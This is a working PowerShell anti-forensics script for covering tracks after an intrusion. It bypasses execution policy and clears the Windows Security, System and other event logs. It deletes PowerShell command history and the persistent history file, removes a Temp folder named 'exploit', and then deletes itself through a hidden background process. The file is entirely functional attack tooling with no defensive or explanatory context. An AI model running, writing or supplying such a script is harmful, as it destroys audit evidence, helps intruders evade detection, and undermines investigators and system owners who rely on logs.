###################################################################
# PowerShell Script to Clear Logs and History
###################################################################
## Run with powershell -ExecutionPolicy Bypass -File clear_logs.ps1

$currentUser = $env:USERNAME

Write-Output "Running session cleanup for user: $currentUser"

# Clear Event Logs
$eventLogs = @("Application", "System", "Security", "Setup", "ForwardedEvents")
foreach ($log in $eventLogs) {
    try {
        Write-Output "Clearing $log event log..."
        Clear-EventLog -LogName $log -ErrorAction Stop
        Write-Output "$log event log cleared."
    } catch {
        Write-Output "Failed to clear $log event log: $_"
    }
}

# Clear PowerShell session history
try {
    Clear-History -Force
    Write-Output "Cleared current PowerShell session history."
} catch {
    Write-Output "Failed to clear PowerShell session history: $_"
}

# Delete persistent PSReadLine history file
$psHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $psHistory) {
    try {
        Remove-Item $psHistory -Force -ErrorAction Stop
        Write-Output "Deleted persistent PowerShell history file."
    } catch {
        Write-Output "Failed to delete persistent history file: $_"
    }
} else {
    Write-Output "No persistent PowerShell history file found."
}

# Delete exploit folder in Temp
$exploitFolder = "$env:USERPROFILE\AppData\Local\Temp\exploit"
if (Test-Path $exploitFolder) {
    try {
        Remove-Item -Path $exploitFolder -Recurse -Force -ErrorAction Stop
        Write-Output "Deleted folder: $exploitFolder"
    } catch {
        Write-Warning "Failed to delete ${exploitFolder}: $_"
    }
} else {
    Write-Output "No exploit folder found in Temp."
}

# Self-delete
Write-Output "Deleting this script"
$myself = $MyInvocation.MyCommand.Path
Start-Sleep -Seconds 1
Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"Start-Sleep 1; Remove-Item -Force -Path '$myself'`"" -WindowStyle Hidden
